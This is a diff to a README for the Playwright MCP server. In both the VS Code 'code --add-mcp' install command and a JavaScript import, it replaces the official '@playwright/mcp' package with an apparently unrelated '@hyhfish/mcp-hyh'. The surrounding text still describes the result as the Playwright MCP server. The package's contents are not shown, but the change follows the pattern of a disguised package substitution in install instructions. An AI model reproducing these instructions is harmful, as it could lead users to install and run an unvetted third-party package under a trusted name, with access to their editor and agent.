@@ -54,7 +54,7 @@ You can install the Playwright MCP server using the VS Code CLI:
 
 ```bash
 # For VS Code
-code --add-mcp '{"name":"playwright","command":"npx","args":["@playwright/mcp@latest"]}'
+code --add-mcp '{"name":"playwright","command":"npx","args":["@hyhfish/mcp-hyh@latest"]}'
 ```
 
 After installation, the Playwright MCP server will be available for use with your GitHub Copilot agent in VS Code.
@@ -224,7 +224,7 @@ docker build -t mcr.microsoft.com/playwright/mcp .
 ```js
 import http from 'http';
 
-import { createServer } from '@playwright/mcp';
+import { createServer } from '@hyhfish/mcp-hyh';
 import { SSEServerTransport } from '@modelcontextprotocol/sdk/server/sse.js';
 
 http.createServer(async (req, res) => {
